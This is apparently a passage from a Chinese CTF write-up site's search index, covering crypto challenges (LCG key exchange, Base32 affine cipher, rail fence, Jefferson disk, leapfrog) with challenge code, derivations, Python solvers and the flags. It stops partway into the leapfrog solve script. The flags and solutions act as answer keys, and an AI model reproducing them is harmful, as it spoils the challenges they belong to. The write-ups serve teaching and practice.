% p def mult ( s , n ): for _ in range ( n ): s = f ( s ) return s A = mult ( s , a_priv ) B = mult ( s , b_priv ) print ( \"A =\" , A ) print ( \"B =\" , B ) shared = mult ( A , b_priv ) assert mult ( B , a_priv ) == shared flag = open ( \"flag.txt\" , \"rb\" ) . read () key = sha256 ( long_to_bytes ( shared )) . digest ()[: 16 ] iv = long_to_bytes ( randint ( 0 , 2 ** 128 )) cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( iv . hex () + cipher . encrypt ( pad ( flag , 16 )) . hex ()) output.txt 1 2 3 4 5 6 7 p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = 118090659823726532118457015460393501353551257181901234830868805299366725758012165845638977878322282762929021570278435511082796994178870962500440332899721398426189888618654464380851733007647761349698218193871563040337609238025971961729401986114391957513108804134147523112841191971447906617102015540889276702905 b = 57950149871006152434673020146375196555892205626959676251724410016184935825712508121123309360222777559827093965468965268147720027647842492655071706063669328135127202250040935414836416360350924218462798003878266563205893267635176851677889275076622582116735064397099811275094311855310291134721254402338711815917 s = 35701581351111604654913348867007078339402691770410368133625030427202791057766853103510974089592411344065769957370802617378495161837442670157827768677411871042401500071366317439681461271483880858007469502453361706001973441902698612564888892738986839322028935932565866492285930239231621460094395437739108335763 A = 27055699502555282613679205402426727304359886337822675232856463708560598772666004663660052528328692282077165590259495090388216629240053397041429587052611133163886938471164829537589711598253115270161090086180001501227164925199272064309777701514693535680247097233110602308486009083412543129797852747444605837628 B = 132178320037112737009726468367471898242195923568158234871773607005424001152694338993978703689030147215843125095282272730052868843423659165019475476788785426513627877574198334376818205173785102362137159225281640301442638067549414775820844039938433118586793458501467811405967773962568614238426424346683176754273 e0364f9f55fc27fc46f3ab1dc9db48fa482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e \u89e3\u9898\u601d\u8def \u00b6 \\(f(x)=ax+b\\ (mod\\ p)\\) \uff0c\u5176\u4e2d \\(p,a,b\\) \u5747\u5df2\u77e5 \\(A, B\\) \u5206\u522b\u4e3a \\(s\\) \u7ecf\u8fc7 \\(a_{priv}, b_{priv}\\) \u6b21 \\(f\\) \u8fd0\u7b97\u540e\u7684\u7ed3\u679c\uff0c\u9700\u8981\u6839\u636e \\(A,B\\) \u6c42 \\(s\\) \u7ecf\u8fc7 \\(a_{priv}+b_{priv}\\) \u6b21 \\(f\\) \u8fd0\u7b97\u540e\u7684\u7ed3\u679c \\(mult(s, n)=a^{n}s+b(a^{n-1} + a^{n-2} + \\dotsb + 1)\\) \\(ax+b\\) \u7684\u5f62\u5f0f\u4e0d\u80fd\u76f4\u63a5 \\(A\\cdot B\\) \u6765\u6c42 shared \uff0c\u53ef\u8fdb\u884c\u8f6c\u6362\uff0c\u8bbe\u5b58\u5728 \\(t\\) \u4f7f\u5f97 \\(a(x+t) = f(x) + t\\) \uff0c\u89e3\u5f97 \\(t = \\frac{b}{a-1}\\) \\[\\begin{equation} \\begin{split} f(mult(s,n-1))+t &= a(mult(s,n-1)+t) \\\\ &=a(a^{n-1}s+b\\cdot(a^{n-2}+a^{n-3}+\\dotsb+1)+t) \\\\ &=a(a^{n-1}s+t\\cdot(a-1)\\cdot(a^{n-2}+a^{n-3}+\\dotsb+1)+t) \\\\ &=a(a^{n-1}s+t\\cdot(a^{n-1}-1)+t) \\\\ &=a^n(s+t) \\end{split} \\end{equation}\\] \u90a3\u4e48\uff0c \\(A+t=a^{a_{priv}}(s+t),B+t=a^{b_{priv}}(s+t)\\) \uff0c shared \u5373 \\(mult(s,a_{priv}+b_{priv})=a^{a_{priv}+b_{priv}}(s+t)-t=\\frac{(A+t)(B+t)}{s+t}-t\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from Crypto.Util.number import long_to_bytes , inverse from Crypto.Cipher import AES from hashlib import sha256 * vars , enc = open ( \"output.txt\" ) . readlines () for v in vars : exec ( v ) iv , ct = bytes . fromhex ( enc [: 32 ]), bytes . fromhex ( enc [ 32 :]) t = b * inverse ( a - 1 , p ) % p shared = (( A + t ) * ( B + t ) * inverse ( s + t , p ) - t ) % p key = sha256 ( long_to_bytes ( shared )) . digest ()[: 16 ] cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( cipher . decrypt ( ct )) Flag \u00b6 corctf{th1s_lcg_3xch4ng3_1s_4_l1ttl3_1ns3cur3_f0r_n0w}","title":"exchanged"},{"location":"crypto/exchanged/#_1","text":"you could make an exchange out of this exchanged.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = randbelow ( p ) b = randbelow ( p ) s = randbelow ( p ) print ( \"p =\" , p ) print ( \"a =\" , a ) print ( \"b =\" , b ) print ( \"s =\" , s ) a_priv = randbelow ( p ) b_priv = randbelow ( p ) def f ( s ): return ( a * s + b ) % p def mult ( s , n ): for _ in range ( n ): s = f ( s ) return s A = mult ( s , a_priv ) B = mult ( s , b_priv ) print ( \"A =\" , A ) print ( \"B =\" , B ) shared = mult ( A , b_priv ) assert mult ( B , a_priv ) == shared flag = open ( \"flag.txt\" , \"rb\" ) . read () key = sha256 ( long_to_bytes ( shared )) . digest ()[: 16 ] iv = long_to_bytes ( randint ( 0 , 2 ** 128 )) cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( iv . hex () + cipher . encrypt ( pad ( flag , 16 )) . hex ()) output.txt 1 2 3 4 5 6 7 p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = 118090659823726532118457015460393501353551257181901234830868805299366725758012165845638977878322282762929021570278435511082796994178870962500440332899721398426189888618654464380851733007647761349698218193871563040337609238025971961729401986114391957513108804134147523112841191971447906617102015540889276702905 b = 57950149871006152434673020146375196555892205626959676251724410016184935825712508121123309360222777559827093965468965268147720027647842492655071706063669328135127202250040935414836416360350924218462798003878266563205893267635176851677889275076622582116735064397099811275094311855310291134721254402338711815917 s = 35701581351111604654913348867007078339402691770410368133625030427202791057766853103510974089592411344065769957370802617378495161837442670157827768677411871042401500071366317439681461271483880858007469502453361706001973441902698612564888892738986839322028935932565866492285930239231621460094395437739108335763 A = 27055699502555282613679205402426727304359886337822675232856463708560598772666004663660052528328692282077165590259495090388216629240053397041429587052611133163886938471164829537589711598253115270161090086180001501227164925199272064309777701514693535680247097233110602308486009083412543129797852747444605837628 B = 132178320037112737009726468367471898242195923568158234871773607005424001152694338993978703689030147215843125095282272730052868843423659165019475476788785426513627877574198334376818205173785102362137159225281640301442638067549414775820844039938433118586793458501467811405967773962568614238426424346683176754273 e0364f9f55fc27fc46f3ab1dc9db48fa482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e","title":"\u9898\u76ee"},{"location":"crypto/exchanged/#_2","text":"\\(f(x)=ax+b\\ (mod\\ p)\\) \uff0c\u5176\u4e2d \\(p,a,b\\) \u5747\u5df2\u77e5 \\(A, B\\) \u5206\u522b\u4e3a \\(s\\) \u7ecf\u8fc7 \\(a_{priv}, b_{priv}\\) \u6b21 \\(f\\) \u8fd0\u7b97\u540e\u7684\u7ed3\u679c\uff0c\u9700\u8981\u6839\u636e \\(A,B\\) \u6c42 \\(s\\) \u7ecf\u8fc7 \\(a_{priv}+b_{priv}\\) \u6b21 \\(f\\) \u8fd0\u7b97\u540e\u7684\u7ed3\u679c \\(mult(s, n)=a^{n}s+b(a^{n-1} + a^{n-2} + \\dotsb + 1)\\) \\(ax+b\\) \u7684\u5f62\u5f0f\u4e0d\u80fd\u76f4\u63a5 \\(A\\cdot B\\) \u6765\u6c42 shared \uff0c\u53ef\u8fdb\u884c\u8f6c\u6362\uff0c\u8bbe\u5b58\u5728 \\(t\\) \u4f7f\u5f97 \\(a(x+t) = f(x) + t\\) \uff0c\u89e3\u5f97 \\(t = \\frac{b}{a-1}\\) \\[\\begin{equation} \\begin{split} f(mult(s,n-1))+t &= a(mult(s,n-1)+t) \\\\ &=a(a^{n-1}s+b\\cdot(a^{n-2}+a^{n-3}+\\dotsb+1)+t) \\\\ &=a(a^{n-1}s+t\\cdot(a-1)\\cdot(a^{n-2}+a^{n-3}+\\dotsb+1)+t) \\\\ &=a(a^{n-1}s+t\\cdot(a^{n-1}-1)+t) \\\\ &=a^n(s+t) \\end{split} \\end{equation}\\] \u90a3\u4e48\uff0c \\(A+t=a^{a_{priv}}(s+t),B+t=a^{b_{priv}}(s+t)\\) \uff0c shared \u5373 \\(mult(s,a_{priv}+b_{priv})=a^{a_{priv}+b_{priv}}(s+t)-t=\\frac{(A+t)(B+t)}{s+t}-t\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from Crypto.Util.number import long_to_bytes , inverse from Crypto.Cipher import AES from hashlib import sha256 * vars , enc = open ( \"output.txt\" ) . readlines () for v in vars : exec ( v ) iv , ct = bytes . fromhex ( enc [: 32 ]), bytes . fromhex ( enc [ 32 :]) t = b * inverse ( a - 1 , p ) % p shared = (( A + t ) * ( B + t ) * inverse ( s + t , p ) - t ) % p key = sha256 ( long_to_bytes ( shared )) . digest ()[: 16 ] cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( cipher . decrypt ( ct ))","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/exchanged/#flag","text":"corctf{th1s_lcg_3xch4ng3_1s_4_l1ttl3_1ns3cur3_f0r_n0w}","title":"Flag"},{"location":"crypto/fanfie/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u89c2\u5bdf\u5b57\u7b26\u4e32 MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI \uff0c\u4ec5\u7531\u5927\u5199\u5b57\u6bcd\u548c\u6570\u5b57 3\u30015\u30017 \u7ec4\u6210\uff0c\u63a8\u6d4b\u7ecf\u8fc7 Base32 \u7f16\u7801 Base32\uff1a32 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\uff0c A-Z \u548c 2-7 \uff0c\u7b49\u53f7\u586b\u5145 BITSCTF{ \u7ecf\u8fc7 Base32 \u7f16\u7801\u540e\u5f97\u5230\uff1a IJEVIU2DKRDHW=== \u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e00\u4e00\u5bf9\u5e94\uff0c\u53d1\u73b0\u4e24\u4e2a M \u90fd\u5bf9\u5e94 I \uff0c\u4e24\u4e2a L \u4e5f\u90fd\u5bf9\u5e94 D \uff0c\u4e3a\u5355\u8868\u4ee3\u6362 1 2 MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI IJEVIU2DKRDHW=== \u6ce8\u610f\u5230 W \u5bf9\u5e94\u7684\u662f\u6570\u5b57 2 \uff0c\u4e0d\u662f\u666e\u901a\u7684\u5b57\u6bcd\u8868\u4ee3\u6362\uff0c\u63a8\u6d4b\u662f Base32 \u5bf9\u5e94\u7684 32 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u3002 M \u4e0e I \u7684\u8ddd\u79bb\u548c L \u4e0e D \u7684\u8ddd\u79bb\u4e0d\u540c\uff0c\u4e0d\u662f\u5355\u7eaf\u7684\u79fb\u4f4d\u52a0\u5bc6\uff0c\u800c\u662f\u4eff\u5c04\u5bc6\u7801 \u8ba1\u7b97\u65b9\u7a0b\u7ec4 \\(\\begin{cases}12a+b\\equiv8&(mod&32)\\\\ 11a+b\\equiv3&(mod&32)\\end{cases}\\) \uff0c\u89e3\u5f97 \\(\\begin{cases}a=5\\\\b=12\\end{cases}\\) \u5148\u4f7f\u7528\u4eff\u5c04\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 IJEVIU2DKRDHWUZSKZ4VSMTUN5RDEWTNPU \uff0c\u518d\u7ecf\u8fc7 Base32 \u89e3\u7801\uff0c\u5373\u53ef\u83b7\u5f97 Flag\uff1a BITSCTF{S2VyY2tob2Zm}","title":"fanfie"},{"location":"crypto/fanfie/#_1","text":"\u89c2\u5bdf\u5b57\u7b26\u4e32 MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI \uff0c\u4ec5\u7531\u5927\u5199\u5b57\u6bcd\u548c\u6570\u5b57 3\u30015\u30017 \u7ec4\u6210\uff0c\u63a8\u6d4b\u7ecf\u8fc7 Base32 \u7f16\u7801 Base32\uff1a32 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\uff0c A-Z \u548c 2-7 \uff0c\u7b49\u53f7\u586b\u5145 BITSCTF{ \u7ecf\u8fc7 Base32 \u7f16\u7801\u540e\u5f97\u5230\uff1a IJEVIU2DKRDHW=== \u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e00\u4e00\u5bf9\u5e94\uff0c\u53d1\u73b0\u4e24\u4e2a M \u90fd\u5bf9\u5e94 I \uff0c\u4e24\u4e2a L \u4e5f\u90fd\u5bf9\u5e94 D \uff0c\u4e3a\u5355\u8868\u4ee3\u6362 1 2 MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI IJEVIU2DKRDHW=== \u6ce8\u610f\u5230 W \u5bf9\u5e94\u7684\u662f\u6570\u5b57 2 \uff0c\u4e0d\u662f\u666e\u901a\u7684\u5b57\u6bcd\u8868\u4ee3\u6362\uff0c\u63a8\u6d4b\u662f Base32 \u5bf9\u5e94\u7684 32 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u3002 M \u4e0e I \u7684\u8ddd\u79bb\u548c L \u4e0e D \u7684\u8ddd\u79bb\u4e0d\u540c\uff0c\u4e0d\u662f\u5355\u7eaf\u7684\u79fb\u4f4d\u52a0\u5bc6\uff0c\u800c\u662f\u4eff\u5c04\u5bc6\u7801 \u8ba1\u7b97\u65b9\u7a0b\u7ec4 \\(\\begin{cases}12a+b\\equiv8&(mod&32)\\\\ 11a+b\\equiv3&(mod&32)\\end{cases}\\) \uff0c\u89e3\u5f97 \\(\\begin{cases}a=5\\\\b=12\\end{cases}\\) \u5148\u4f7f\u7528\u4eff\u5c04\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 IJEVIU2DKRDHWUZSKZ4VSMTUN5RDEWTNPU \uff0c\u518d\u7ecf\u8fc7 Base32 \u89e3\u7801\uff0c\u5373\u53ef\u83b7\u5f97 Flag\uff1a BITSCTF{S2VyY2tob2Zm}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/he_thrusts_his_fists_against_the_post/","text":"\u9898\u76ee \u00b6 {ea-vetgaytereoreh-na}fan--wshbestpasslds-s-hm \u89e3\u9898\u601d\u8def \u00b6 \u7531\u82b1\u62ec\u53f7\u548c flag \u76f8\u5173\u5b57\u6bcd\u63a8\u6d4b\u662f\u7f6e\u6362\u5bc6\u7801\uff0c\u7531\u6b64\u60f3\u5230\u300c\u6805\u680f\u5bc6\u7801\u300d \u56e0\u4e3a { \u5728\u9996\u4f4d\uff0c\u52a0\u5bc6\u7684\u504f\u79fb\u91cf\u663e\u7136\u4e0d\u4e3a \\(0\\) \u679a\u4e3e\u5206\u7ec4\u957f\u5ea6\u548c\u504f\u79fb\u91cf\uff0c\u5f53\u5206\u7ec4\u957f\u5ea6\u4e3a \\(4\\) \uff0c\u504f\u79fb\u91cf\u4e3a \\(2\\) \u65f6\uff0c\u89e3\u51fa Flag\uff1a flag{and-yet-swears-he-observes-the-phantasms} \u504f\u79fb\u91cf Offset \u00b6 \u660e\u6587\u6d88\u606f\u4e3a \\(M\\) \uff0c\u52a0\u5bc6\u65f6\uff0c\u6805\u680f\u5bc6\u7801\u5206\u7ec4\u957f\u5ea6 \\(N\\) \u53ef\u4ee5\u89c6\u4e3a \\(N\\) \u884c\uff0c\u504f\u79fb\u91cf \\(x\\) \u8868\u793a\u4ece\u7b2c \\(x\\) \u884c\u5f00\u59cb\u8f93\u5165\u5b57\u7b26 \u53ef\u4ee5\u6269\u5c55\u5230 \\(N \\le x < 2 \\times (N - 1)\\) \uff08\u5f53 \\(x \\ge 2 \\times (N - 1)\\) \u65f6\uff0c\u4e0e \\(N \\le x < 2 \\times (N - 1)\\) \u5305\u542b\u7684\u60c5\u51b5\u4e00\u81f4\uff09\uff0c\u8868\u793a\u4ece\u7b2c \\(x\\) \u4e2a\u4f4d\u7f6e\uff08\u6309\u7167\u6ca1\u6709\u504f\u79fb\u91cf\u65f6\u7684\u8f93\u5165\u4f4d\u7f6e\uff09\u5f00\u59cb\u8f93\u5165\u5b57\u7b26 \u53c2\u8003\u8d44\u6599 \u00b6 Rail Fence, Zig-Zag - online encoder / decoder","title":"He Thrusts His Fists Against the Post"},{"location":"crypto/he_thrusts_his_fists_against_the_post/#_1","text":"{ea-vetgaytereoreh-na}fan--wshbestpasslds-s-hm","title":"\u9898\u76ee"},{"location":"crypto/he_thrusts_his_fists_against_the_post/#_2","text":"\u7531\u82b1\u62ec\u53f7\u548c flag \u76f8\u5173\u5b57\u6bcd\u63a8\u6d4b\u662f\u7f6e\u6362\u5bc6\u7801\uff0c\u7531\u6b64\u60f3\u5230\u300c\u6805\u680f\u5bc6\u7801\u300d \u56e0\u4e3a { \u5728\u9996\u4f4d\uff0c\u52a0\u5bc6\u7684\u504f\u79fb\u91cf\u663e\u7136\u4e0d\u4e3a \\(0\\) \u679a\u4e3e\u5206\u7ec4\u957f\u5ea6\u548c\u504f\u79fb\u91cf\uff0c\u5f53\u5206\u7ec4\u957f\u5ea6\u4e3a \\(4\\) \uff0c\u504f\u79fb\u91cf\u4e3a \\(2\\) \u65f6\uff0c\u89e3\u51fa Flag\uff1a flag{and-yet-swears-he-observes-the-phantasms}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/he_thrusts_his_fists_against_the_post/#offset","text":"\u660e\u6587\u6d88\u606f\u4e3a \\(M\\) \uff0c\u52a0\u5bc6\u65f6\uff0c\u6805\u680f\u5bc6\u7801\u5206\u7ec4\u957f\u5ea6 \\(N\\) \u53ef\u4ee5\u89c6\u4e3a \\(N\\) \u884c\uff0c\u504f\u79fb\u91cf \\(x\\) \u8868\u793a\u4ece\u7b2c \\(x\\) \u884c\u5f00\u59cb\u8f93\u5165\u5b57\u7b26 \u53ef\u4ee5\u6269\u5c55\u5230 \\(N \\le x < 2 \\times (N - 1)\\) \uff08\u5f53 \\(x \\ge 2 \\times (N - 1)\\) \u65f6\uff0c\u4e0e \\(N \\le x < 2 \\times (N - 1)\\) \u5305\u542b\u7684\u60c5\u51b5\u4e00\u81f4\uff09\uff0c\u8868\u793a\u4ece\u7b2c \\(x\\) \u4e2a\u4f4d\u7f6e\uff08\u6309\u7167\u6ca1\u6709\u504f\u79fb\u91cf\u65f6\u7684\u8f93\u5165\u4f4d\u7f6e\uff09\u5f00\u59cb\u8f93\u5165\u5b57\u7b26","title":"\u504f\u79fb\u91cf Offset"},{"location":"crypto/he_thrusts_his_fists_against_the_post/#_3","text":"Rail Fence, Zig-Zag - online encoder / decoder","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/jefferson_disk/","text":"\u9898\u76ee \u00b6 01: < ZWAXJGDLUBVIQHKYPNTCRMOSFE < 02: < KPBELNACZDTRXMJQOYHGVSFUWI < 03: < BDMAIZVRNSJUWFHTEQGYXPLOCK < 04: < RPLNDVHGFCUKTEBSXQYIZMJWAO < 05: < IHFRLABEUOTSGJVDKCPMNZQWXY < 06: < AMKGHIWPNYCJBFZDRUSLOQXVET < 07: < GWTHSPYBXIZULVKMRAFDCEONJQ < 08: < NOZUTWDCVRJLXKISEFAPMYGHBQ < 09: < XPLTDSRFHENYVUBMCQWAOIKZGJ < 10: < UDNAJFBOWTGVRSCZQKELMXYIHP < 11: < MNBVCXZQWERTPOIUYALSKDJFHG < 12: < LVNCMXZPQOWEIURYTASBKJDFHG < 13: < JZQAWSXCDERFVBGTYHNUMKILOP < \u5bc6\u94a5\u4e3a: 2, 3, 7, 5, 13, 12, 9, 1, 8, 10, 4, 11, 6 \u5bc6\u6587\u4e3a: NFQKSEVOQOFNP \u89e3\u9898\u601d\u8def \u00b6 \u5148\u6309\u5bc6\u94a5\u987a\u5e8f\u5bf9\u884c\u8fdb\u884c\u6392\u5e8f\uff0c\u5bf9\u6bcf\u4e00\u884c\uff0c\u6eda\u52a8\u5b57\u6bcd\u8868\u4f7f\u5bc6\u6587\u5b57\u7b26\u4f4d\u4e8e\u540c\u4e00\u5217\uff08\u5982\u9996\u5217\uff09 Line Alphabets 2 NACZDTRXMJQOYHGVS F UWIKPBEL 3 FHTEQGYXPLOCKBDMA I ZVRNSJUW 7 QGWTHSPYBXIZULVKM R AFDCEONJ 5 KCPMNZQWXYIHFRLAB E UOTSGJVD 13 SXCDERFVBGTYHNUMK I LOPJZQAW 12 EIURYTASBKJDFHGLV N CMXZPQOW 9 VUBMCQWAOIKZGJXPL T DSRFHENY 1 OSFEZWAXJGDLUBVIQ H KYPNTCRM 8 QNOZUTWDCVRJLXKIS E FAPMYGHB 10 OWTGVRSCZQKELMXYI H PUDNAJFB 4 FCUKTEBSXQYIZMJWA O RPLNDVHG 11 NBVCXZQWERTPOIUYA L SKDJFHGM 6 PNYCJBFZDRUSLOQXV E TAMKGHIW \u4f9d\u6b21\u67e5\u770b\u6bcf\u4e00\u5217\uff0c\u627e\u5230\u6709\u5b9e\u9645\u610f\u4e49\u7684\u5373\u4e3a Flag\uff1a FIREINTHEHOLE \u53c2\u8003\u8d44\u6599 \u00b6 Jefferson disk - Wikipedia","title":"\u8f6c\u8f6e\u673a\u52a0\u5bc6"},{"location":"crypto/jefferson_disk/#_1","text":"01: < ZWAXJGDLUBVIQHKYPNTCRMOSFE < 02: < KPBELNACZDTRXMJQOYHGVSFUWI < 03: < BDMAIZVRNSJUWFHTEQGYXPLOCK < 04: < RPLNDVHGFCUKTEBSXQYIZMJWAO < 05: < IHFRLABEUOTSGJVDKCPMNZQWXY < 06: < AMKGHIWPNYCJBFZDRUSLOQXVET < 07: < GWTHSPYBXIZULVKMRAFDCEONJQ < 08: < NOZUTWDCVRJLXKISEFAPMYGHBQ < 09: < XPLTDSRFHENYVUBMCQWAOIKZGJ < 10: < UDNAJFBOWTGVRSCZQKELMXYIHP < 11: < MNBVCXZQWERTPOIUYALSKDJFHG < 12: < LVNCMXZPQOWEIURYTASBKJDFHG < 13: < JZQAWSXCDERFVBGTYHNUMKILOP < \u5bc6\u94a5\u4e3a: 2, 3, 7, 5, 13, 12, 9, 1, 8, 10, 4, 11, 6 \u5bc6\u6587\u4e3a: NFQKSEVOQOFNP","title":"\u9898\u76ee"},{"location":"crypto/jefferson_disk/#_2","text":"\u5148\u6309\u5bc6\u94a5\u987a\u5e8f\u5bf9\u884c\u8fdb\u884c\u6392\u5e8f\uff0c\u5bf9\u6bcf\u4e00\u884c\uff0c\u6eda\u52a8\u5b57\u6bcd\u8868\u4f7f\u5bc6\u6587\u5b57\u7b26\u4f4d\u4e8e\u540c\u4e00\u5217\uff08\u5982\u9996\u5217\uff09 Line Alphabets 2 NACZDTRXMJQOYHGVS F UWIKPBEL 3 FHTEQGYXPLOCKBDMA I ZVRNSJUW 7 QGWTHSPYBXIZULVKM R AFDCEONJ 5 KCPMNZQWXYIHFRLAB E UOTSGJVD 13 SXCDERFVBGTYHNUMK I LOPJZQAW 12 EIURYTASBKJDFHGLV N CMXZPQOW 9 VUBMCQWAOIKZGJXPL T DSRFHENY 1 OSFEZWAXJGDLUBVIQ H KYPNTCRM 8 QNOZUTWDCVRJLXKIS E FAPMYGHB 10 OWTGVRSCZQKELMXYI H PUDNAJFB 4 FCUKTEBSXQYIZMJWA O RPLNDVHG 11 NBVCXZQWERTPOIUYA L SKDJFHGM 6 PNYCJBFZDRUSLOQXV E TAMKGHIW \u4f9d\u6b21\u67e5\u770b\u6bcf\u4e00\u5217\uff0c\u627e\u5230\u6709\u5b9e\u9645\u610f\u4e49\u7684\u5373\u4e3a Flag\uff1a FIREINTHEHOLE","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/jefferson_disk/#_3","text":"Jefferson disk - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/leapfrog/","tags":["algebra"],"text":"#algebra .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 leapfrog.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from Crypto.Util.number import long_to_bytes , getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow from random import sample p = getPrime ( 256 ) a = randbelow ( p ) b = randbelow ( p ) s = randbelow ( p ) def f ( s ): return ( a * s + b ) % p jumps = sample ( range ( 3 , 25 ), 12 ) output = [ s ] for jump in jumps : for _ in range ( jump ): s = f ( s ) output . append ( s ) print ( jumps ) print ( output ) flag = open ( \"flag.txt\" , \"rb\" ) . read () key = sha256 ( b \"\" . join ([ long_to_bytes ( x ) for x in [ a , b , p ]])) . digest ()[: 16 ] iv = long_to_bytes ( randbelow ( 2 ** 128 )) cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( iv . hex () + cipher . encrypt ( pad ( flag , 16 )) . hex ()) output.txt 1 2 3 [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] [26242498579536691811055981149948736081413123636643477706015419836101346754443, 30320412755241177141099565765265147075632060183801443609889236855980299685595, 65684356693401962957802832810273549345608027337432965824937963429120291339333, 15025547765549333168957368149177848577882555487889680742466312084547650972663, 46764069432060214735440855620792051531943268335710103593983788232446614161424, 71575544531523096893697176151110271985899529970263634996534766185719951232899, 8149547548198503668415702507621754973088994278880874813606458793607866713778, 12081871161483608517505346339140143493132928051760353815508503241747142024697, 65627056932006241674763356339068429188278123434638526706264676467885955099667, 23413741607307309476964696379608864503970503243566103692132654387385869400762, 56014408298982744092873649879675961526790332954773022900206888891912862484806, 77000766146189604405769394813422399327596415228762086351262010618717119973525, 14589246063765426640159853561271509992635998018136452450026806673980229327448] 05ac5b17c67bcfbf5c43fa9d319cfc4c62ee1ce1ab2130846f776e783e5797ac1c02a34045e4130f3b8111e57397df344bd0e14f3df4f1a822c43c7a89fd4113f9a7702b0b0e0b0473a2cbac25e1dd9c \u89e3\u9898\u601d\u8def \u00b6 \u4e0e exchanged \u7c7b\u4f3c\uff0c\u540c\u6837\u4f7f\u7528\u5230\u4e86\u51fd\u6570 \\(f(x)\\) \uff0c\u4e0d\u8fc7 \\(p,a,b\\) \u6ca1\u6709\u76f4\u63a5\u7ed9\u51fa \u5df2\u77e5\u521d\u59cb\u503c \\(s\\) \u3001\u6bcf\u6b21\u8fed\u4ee3\u7684\u6b21\u6570\u53ca\u7ed3\u679c \u8bbe \\(B\\) \u662f \\(A\\) \u7ecf\u8fc7 \\(n\\) \u6b21 \\(f\\) \u8fed\u4ee3\u540e\u7684\u7ed3\u679c\uff0c\u90a3\u4e48\u6709 \\(B + t = a^n(A + t)\\) \u3002\u6ce8\u610f\u5230\u6570\u7ec4 jumps \u5b58\u5728\u591a\u4e2a\u5b50\u6570\u7ec4\u96c6\u5408\uff0c\u6ee1\u8db3\u540c\u4e00\u96c6\u5408\u5185\u5b50\u6570\u7ec4\u7684\u548c\u76f8\u540c \u8bbe\u5b58\u5728\u4e2d\u95f4\u8fed\u4ee3\u7ed3\u679c \\(A,B,C,D\\) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\[\\begin{equation} \\begin{split} B+t \\equiv a^n(A+t)\\ (mod\\ p) \\\\ C+t \\equiv a^n(B+t)\\ (mod\\ p) \\\\ D+t \\equiv a^n(C+t)\\ (mod\\ p) \\\\ \\end{split} \\end{equation}\\] \u90a3\u4e48\u6709 \\((B-C)\\equiv a^n(A-B)\\ (mod\\ p)\\) \u4ee5\u53ca \\((C-D)\\equiv a^n(B-C)\\ (mod\\ p)\\) \uff0c\u4e24\u5f0f\u76f8\u9664\u6d88\u53bb \\(a\\) \u53ef\u5f97 \\((B-C)(C-D)^{-1}\\equiv (A-B)(B-C)^{-1}\\ (mod\\ p)\\) \uff0c\u5373 \\((B-C)(B-C)-(A-B)(C-D)\\equiv 0\\ (mod\\ p)\\) \uff08\u4e0e \\((B-D)(B-C)-(A-C)(C-D)\\equiv 0\\ (mod\\ p)\\) \u662f\u7b49\u4ef7\uff09 \u7ed3\u5408\u591a\u4e2a\u5b50\u6570\u7ec4\u96c6\u5408\uff0c\u901a\u8fc7 GCD \u6c42\u51fa \\(p\\) \uff0c\u968f\u540e\u518d\u6c42\u51fa \\(a,b\\) \u5373\u53ef Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from math import gcd from sympy import nthroot_mod from hashlib import sha256 from Crypto.Cipher import AES from Crypto.Util.number import inverse 